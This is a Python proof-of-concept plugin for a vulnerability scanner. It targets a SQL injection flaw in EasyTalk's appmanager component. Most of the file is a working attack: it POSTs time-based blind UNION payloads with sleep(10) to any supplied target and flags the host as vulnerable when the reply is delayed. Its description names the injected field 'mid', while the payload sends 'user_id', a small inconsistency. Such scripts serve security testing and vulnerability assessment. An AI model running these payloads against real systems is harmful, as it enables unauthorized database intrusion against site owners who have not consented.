# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time


class Vuln(ABVuln):
    vuln_id = 'EasyTalk_0023'  # 平台漏洞编号，留空
    name = 'EasyTalk Sql Injection '  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-02-09'  # 漏洞公布时间
    desc = '''
        EasyTalk 在appmanageraction.class.php 中
        $mid=$_POST['mid'];
        where user_id='$mid'无过滤。
        带入查询，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'EasyTalk'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ab7b65ce-156c-4b01-8a14-c1ec3245407e'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-19'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/?m=appmanager&a=init"
            data_sleep = "user_id=123' union select sleep(10),2,3,4#"
            data_normal = "user_id=123' union select 1,2,3,4#"
            url = self.target + payload
            time_start = time.time()
            requests.post(url, data=data_normal)
            time_end_normal = time.time()
            requests.post(url, data=data_sleep)
            time_end_sleep = time.time()

            if (time_end_sleep-time_end_normal) - (time_end_normal-time_start) > 9:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
